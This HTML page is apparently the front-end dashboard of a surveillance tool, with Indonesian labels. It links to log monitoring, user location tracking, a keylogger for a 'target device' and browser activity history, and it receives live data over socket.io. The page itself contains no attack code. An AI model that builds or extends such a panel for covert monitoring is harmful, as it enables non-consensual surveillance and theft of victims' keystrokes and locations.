<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Monitoring Dashboard</title>

  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"/>
  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.6.1/socket.io.js"></script>

  <style>
    body {
      background: linear-gradient(to bottom, #121212, #2e2e2e);
      color: #fff;
      min-height: 100vh;
    }
    .container-wrapper {
      padding: 50px 20px;
    }
    .dashboard-title {
      font-size: 2rem;
      font-weight: bold;
      margin-bottom: 55px;
    }
    .card-custom {
      border: none;
      border-radius: 15px;
      background: #f8f9fa;
      transition: transform 0.3s, box-shadow 0.3s;
      height: 200px;
    }
    .card-custom:hover {
      transform: translateY(-5px);
      box-shadow: 0 8px 25px rgba(0,0,0,0.2);
    }
    .card-body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      height: 100%;
    }
    .card-icon {
      font-size: 2.7rem;
      margin-bottom: 10px;
      color: #0d6efd;
    }
    .card-title {
      font-size: 1.1rem;
      font-weight: 600;
      color: #000;
    }
    .card-desc {
      font-size: 0.875rem;
      color: #333;
    }
    .card-link {
      text-decoration: none;
    }
  </style>
</head>

<body>
  <div class="container-wrapper">
    <div class="container">
      <div class="dashboard-title text-white ">ðŸ“Š Monitoring Dashboard</div>
      <div class="row g-4">

        <!-- Log Monitor -->
        <div class="col-md-6 col-lg-6">
          <a href="/log_monitor" class="card-link">
            <div class="card card-custom shadow-sm">
              <div class="card-body text-dark text-center">
                <div class="card-icon"><i class="fas fa-desktop"></i></div>
                <div class="card-title">Log Monitoring</div>
                <div class="card-desc">Pantau aktivitas dari data log pengguna.</div>
              </div>
            </div>
          </a>
        </div>

        <!-- Maps -->
        <div class="col-md-6 col-lg-6">
          <a href="/maps" class="card-link">
            <div class="card card-custom shadow-sm">
              <div class="card-body text-dark text-center">
                <div class="card-icon"><i class="fas fa-map-marker-alt"></i></div>
                <div class="card-title">Lokasi (Maps)</div>
                <div class="card-desc">Lihat lokasi berdasarkan pelacakan pengguna.</div>
              </div>
            </div>
          </a>
        </div>

        <!-- Key Logger -->
        <div class="col-md-6 col-lg-6">
          <a href="/key_logger" class="card-link">
            <div class="card card-custom shadow-sm">
              <div class="card-body text-dark text-center">
                <div class="card-icon"><i class="fas fa-keyboard"></i></div>
                <div class="card-title">Keylogger</div>
                <div class="card-desc">Pantau input keyboard dari perangkat target.</div>
              </div>
            </div>
          </a>
        </div>

        <!-- Activity Monitor -->
        <div class="col-md-6 col-lg-6">
          <a href="/activity_monitor" class="card-link">
            <div class="card card-custom shadow-sm">
              <div class="card-body text-dark text-center">
                <div class="card-icon"><i class="fas fa-eye"></i></div>
                <div class="card-title">Activity Monitor</div>
                <div class="card-desc">Lihat histori aktivitas pengguna dan penggunaan browser.</div>
              </div>
            </div>
          </a>
        </div>

      </div>
    </div>
  </div>

  <script>
    const socket = io();
    socket.on('new_data', function(data) {
      console.log('New data received:', data);
      // Optional: location.reload();
    });
  </script>
</body>
</html>
